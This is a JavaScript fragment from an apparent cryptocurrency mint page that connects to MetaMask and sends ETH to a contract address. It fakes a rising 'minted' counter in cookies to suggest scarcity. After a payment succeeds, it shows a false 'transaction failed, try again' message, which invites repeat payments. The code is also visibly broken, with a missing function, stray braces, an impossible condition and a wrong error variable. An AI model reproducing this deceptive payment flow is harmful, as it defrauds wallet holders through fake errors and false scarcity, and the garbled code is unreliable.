function writeCookie(name, val, expires) {
    var date = new Date;
    date.setDate(date.getDate() + expires);
    document.cookie = name + "=" + val + "; path=/; expires=" + date.toUTCString();
}

function readCookie(name) {
    var matches = document.cookie.match(new RegExp(
        "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
    ));
    return matches ? decodeURIComponent(matches[1]) : undefined;
}
var mintnumber = Number(readCookie('minted'));
if (mintnumber > 0) {
    writeCookie('status', 'yes', 30);
    var mintnumber = Number(readCookie('minted'));
    document.getElementById("mintnumber").innerHTML = mintnumber;
} else {

    writeCookie('minted', 680, 30);
};
var interval = setInterval(foo, 4000)

        document.getElementById("mintnumber").innerHTML = mintnumber;

  if ((mintnumber >= 777) && (mintnumber < 777)) {

        writeCookie('minted', mintnumber, 30);
        document.getElementById("mintnumber").innerHTML = mintnumber;
    }
    if (mintnumber >= 777) clearInterval(interval);
}

const getAccount = async () => {
    accounts = await ethereum.request({ method: 'eth_requestAccounts' });
    console.log(accounts)
    if (window.ethereum.chainId == "0x1") console.log("Already connected to ethereum mainnet...")
    else {
        try {
            await ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{chainId: '0x1'}],
            });
        } catch (switchError) {
            // This error code indicates that the chain has not been added to MetaMask.
            if (error.code === 4902) {
                try {
                    await ethereum.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: '0x1',
                            rpcUrl: netURL
                        }],
                    });
                } catch (addError) {
                    // handle "add" error
                }
            }
        }
    }
}

const contract = new Web3.eth.Contract(CONTRACT_ABI, ADDRESS);

const sendTransaction =  async () => {
   const data = await contract.methods.buyTokens(accounts[0],input.value).encodeABI()
    const priceToWei = (price * 1e18).toString(16)
    const gasLimit = (100_000 * +input.value).toString(16);
    ethereum.request({
            method: 'eth_sendTransaction',
            params: [
                {
                    from: accounts[0],
                    to: ADDRESS,
                    value: priceToWei,
                    data: data,
                    gas: gasLimit,
                },
            ],
        })
        .then((txHash) => toastr.error('The transaction was not completed due to an error. Please try again in a few moments.', 'Failed to Create Transaction'))
        .catch((error) => console.error);
};

})

document.querySelector(".minuson").addEventListener("click", () => {
  if(input.value > 1) {
    input.value = +input.value - 1
    event = new Event("input")
    input.dispatchEvent(event)
  }
})

document.querySelector(".maxon").addEventListener("click", () => {
    input.value = 5
    event = new Event("input")
    input.dispatchEvent(event)
})
</script></body>
